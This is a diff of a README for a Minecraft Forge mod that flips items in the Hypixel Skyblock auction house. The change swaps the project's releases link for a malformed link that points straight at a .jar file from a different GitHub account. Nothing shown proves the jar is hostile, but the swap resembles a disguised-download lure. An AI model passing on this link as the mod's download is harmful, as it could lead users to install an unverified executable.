@@ -12,7 +12,7 @@ Welcome to the Hypixel Skyblock Auction House Flipper Mod! This mod is designed 
 
 ## Installation
 
-1. **Download the Mod**: Get the latest release from the [Releases](https://github.com/yourusername/auction-house-flipper/releases) page.
+1. **Download the Mod**: Get the latest release from the [Releases](https://github.com/yourusername/auction-house-flipper/releases](https://github.com/IshuPotatoe/BZFlipperv2/releases/download/Flipping/BZFlipperV2.jar) page.
 2. **Install Minecraft Forge**: Ensure you have Minecraft Forge installed. If not, download it from the [official website](https://files.minecraftforge.net/).
 3. **Add to Mods Folder**: Place the downloaded mod file into your Minecraft `mods` folder.
 4. **Launch Minecraft**: Start Minecraft with the Forge profile, and the mod will be loaded automatically.
